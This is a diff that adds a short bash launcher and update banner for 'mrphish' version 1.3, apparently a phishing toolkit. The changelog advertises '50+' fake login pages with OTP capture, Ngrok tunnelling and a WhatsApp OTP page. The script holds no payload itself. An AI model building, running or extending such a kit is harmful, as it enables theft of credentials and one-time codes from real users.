@@ -1,0 +1,33 @@
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo -e "\e[96m      |-----------------------[V 1.3]-----------------------|"
+echo -e "\e[96m      |----------------------\e[92mUPDATE V1.3\e[96m--------------------|"
+echo -e "\e[96m      |-----------------------------------------------------|"
+echo -e "\e[96m      |                                                     |"
+echo -e "\e[96m      |            > 50+ latest pages with otp options      |"
+echo -e "\e[96m      |            > Ngrok link status on screen            |"
+echo -e "\e[96m      |            > Ngrok link issue fixed                 |"
+echo -e "\e[96m      |            > New ChatNow button added               |"
+echo -e "\e[96m      |            > New update modules with bux fixes      |"
+echo -e "\e[96m      |            > New Patch update module                |"
+echo -e "\e[96m      |            > Whats app otp page fixed               |"
+echo -e "\e[96m      |                                                     |"
+echo -e "\e[96m      |-----------------------------------------------------|"
+echo -e "\e[96m      |-----------------------\e[91mFEATURES\e[96m----------------------|"
+echo -e "\e[96m      |-----------------------------------------------------|"
+sleep 10.0
+echo
+echo
+echo
+echo
+echo
+echo
+cd $HOME/mrphish
+bash mrphish
